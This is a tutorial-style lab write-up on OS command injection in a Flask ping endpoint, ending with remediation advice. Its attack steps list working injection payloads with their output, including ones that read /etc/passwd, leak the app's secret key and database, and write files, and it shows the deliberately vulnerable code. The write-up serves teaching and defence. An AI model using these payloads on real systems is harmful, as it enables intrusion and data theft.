# Command Injection — OS Command Execution via Shell Metacharacters

## Overview

Command injection occurs when a web application passes user input directly into an operating system shell command. Unlike SQL injection (which targets the database) or LFI (which only reads files), command injection gives the attacker **full access to the operating system** — they can read files, write files, install programs, open network connections, and execute arbitrary code.

It is consistently ranked in the OWASP Top 10 under "Injection" and is one of the most severe vulnerabilities a web application can have.

## Vulnerable Code

```python
@app.route('/ping', methods=['GET', 'POST'])
def ping_tool():
    host = request.form.get('host', '')
    
    # VULNERABLE: user input goes directly into a shell command
    cmd = f"ping -c 2 {host}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    return render_template('ping.html', output=result.stdout)
```

Two things make this dangerous: `f"ping -c 2 {host}"` puts user input directly into the command string, and `shell=True` tells Python to run it through `/bin/sh`, which interprets all shell metacharacters.

## Shell Metacharacters

The shell (bash, sh) treats certain characters as control operators. An attacker uses these to break out of the intended command and append their own:

| Character | Meaning | Example |
|-----------|---------|---------|
| `;` | Sequential execution | `ping host; whoami` |
| `&&` | Run if previous succeeds | `ping host && whoami` |
| `\|\|` | Run if previous fails | `invalid \|\| whoami` |
| `\|` | Pipe output | `ping host \| whoami` |
| `$(cmd)` | Command substitution | `ping $(whoami)` |
| `` `cmd` `` | Legacy substitution | `` ping `whoami` `` |
| `\n` | Newline (separator) | `ping host\nwhoami` |

Filtering just one of these is not enough — all of them must be addressed.

## Attack Steps

### Step 1 — Confirm Normal Operation
```
Host: 127.0.0.1
→ ping -c 2 127.0.0.1
→ Normal ping output
```

### Step 2 — Test Injection
```
Host: 127.0.0.1; whoami
→ ping -c 2 127.0.0.1; whoami
→ Ping output + "potato" (the server's username)
```

The semicolon ended the ping command and started a new one. The server executed both and returned combined output.

### Step 3 — System Reconnaissance
```
Host: ; id                → uid=1000(potato) gid=1000(potato) groups=...
Host: ; uname -a          → Linux debian 6.1.0 #1 SMP x86_64 GNU/Linux
Host: ; hostname           → debian
Host: ; pwd                → /home/potato/Desktop/web_project/vulnerable
Host: ; ip addr show       → Network configuration
```

The attacker now knows: who the process runs as, what OS version, what machine, the full application path, and the network layout.

### Step 4 — Read Sensitive Files
```
Host: ; cat /etc/passwd         → All system users
Host: ; head -10 app.py        → Application source code (SECRET_KEY, DB path)
Host: ; cat instance/notes.db  → Raw database file
```

This achieves the same result as LFI but through a different mechanism. LFI uses path traversal to trick the application into opening files; command injection runs `cat` directly.

### Step 5 — Write Files and Execute Programs
```
Host: ; echo 'HACKED' > /tmp/proof.txt    → Write a file
Host: ; cat /tmp/proof.txt                 → Verify: "HACKED"
Host: ; which curl                          → /usr/bin/curl (available!)
Host: ; which python3                       → /usr/bin/python3 (available!)
```

The attacker can write files, download tools, and run programs. With `curl` or `wget` available, they could download a reverse shell script and execute it — gaining persistent interactive access to the server.

## LFI vs Command Injection

| Capability | LFI | Command Injection |
|-----------|-----|-------------------|
| Read files | Yes (via path traversal) | Yes (via cat, head, etc.) |
| Write files | No | Yes (via echo, tee, etc.) |
| Execute programs | No (except Werkzeug debug) | Yes (any program on the system) |
| Network access | No | Yes (curl, wget, nc, ssh) |
| Process control | No | Yes (kill, bg, nohup) |
| Severity | High | **Critical** |

LFI is a "read-only" vulnerability. Command injection is "full access."

## Fix (Remediation)

### 1. Never Use `shell=True` with User Input

```python
# VULNERABLE:
cmd = f"ping -c 2 {host}"
subprocess.run(cmd, shell=True, ...)

# SAFE — pass arguments as a list:
subprocess.run(["ping", "-c", "2", host], capture_output=True, text=True, timeout=10)
```

When `shell=False` (the default), Python calls `ping` directly without going through a shell. The `host` variable is passed as a single argument — shell metacharacters like `;`, `|`, `&&` are treated as literal characters, not operators.

### 2. Input Validation (Defense in Depth)

```python
import re

# Only allow hostnames and IPs
if not re.match(r'^[a-zA-Z0-9._-]+$', host):
    return "Invalid hostname", 400
```

Even with `shell=False`, validating input is good practice. A strict allowlist of characters prevents unexpected behavior.

### 3. Avoid Shell Commands Entirely

```python
import socket

# Use Python's built-in networking instead of shell commands
try:
    ip = socket.gethostbyname(host)
    return f"{host} resolves to {ip} — host is reachable"
except socket.gaierror:
    return f"Cannot resolve {host}"
```

The safest approach is to avoid calling external commands altogether and use language-native libraries instead.

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [PortSwigger OS Command Injection Labs](https://portswigger.net/web-security/os-command-injection)
